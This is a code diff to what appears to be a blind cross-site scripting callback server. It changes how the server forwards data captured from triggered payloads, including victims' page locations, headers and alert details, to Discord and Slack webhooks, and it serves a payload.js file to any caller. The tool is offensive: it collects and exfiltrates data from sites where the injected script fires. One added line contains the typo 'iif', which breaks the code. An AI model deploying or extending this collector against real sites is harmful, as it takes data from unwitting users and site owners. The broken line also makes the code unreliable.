@@ -153,13 +153,22 @@ app.post("/c", async (req, res) => {
     const alert = generate_blind_xss_alert(data);
     data = { form: { payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }) } };
 
-    request.post(process.env.DISCORD_INCOMING_WEBHOOK, { form: { username: "bxss", content: location } }, function (error, response, body) {
-        console.log(body);
-    });
-    request.post(slack_incoming_webhook, data, (out) => {
-        res.send("ok\n");
-        res.end();
-    });
+    iif (process.env.DISCORD_INCOMING_WEBHOOK !== undefined && process.env.DISCORD_INCOMING_WEBHOOK != "") {
+        request.post(process.env.DISCORD_INCOMING_WEBHOOK, { form: { username: "bxss", content: location } }, function (error, response, body) {
+            //console.log(body);
+            console.log("[!] XSS blind payload triggered! Data sent to discord.");
+        });
+    }
+
+    if (slack_incoming_webhook !== undefined && slack_incoming_webhook != "") {
+        request.post(slack_incoming_webhook, data, (out) => {
+            console.log("[!] XSS blind payload triggered! Data sent to slack.");
+        });
+    }
+
+    res.send("ok\n");
+    res.end();
+
 });
 
 /**
@@ -204,13 +213,19 @@ app.all("/*", (req, res) => {
     const alert = generate_callback_alert(headers, data, req.url);
     data = { form: { payload: JSON.stringify({ username: "BXSS", mrkdwn: true, text: alert }) } };
 
-    request.post(process.env.DISCORD_INCOMING_WEBHOOK, { form: { username: "bxss", content: alert } }, function (error, response, body) {
-        console.log(body);
-    });
+    if (process.env.DISCORD_INCOMING_WEBHOOK !== undefined && process.env.DISCORD_INCOMING_WEBHOOK != "") {
+        request.post(process.env.DISCORD_INCOMING_WEBHOOK, { form: { username: "bxss", content: alert } }, function (error, response, body) {
+            //console.log(body);
+            console.log("[!] request sent to discord.");
+        });
+    }
 
-    request.post(slack_incoming_webhook, data, (out) => {
-        res.sendFile(path.join(__dirname + "/payload.js"));
-    });
+    if (slack_incoming_webhook !== undefined && slack_incoming_webhook != "") {
+        request.post(slack_incoming_webhook, data, (out) => {
+            console.log("[!] request sent to slack.");
+        });
+    }
+    res.sendFile(path.join(__dirname + "/payload.js"));
 });
 
 app.listen(port, (err) => {
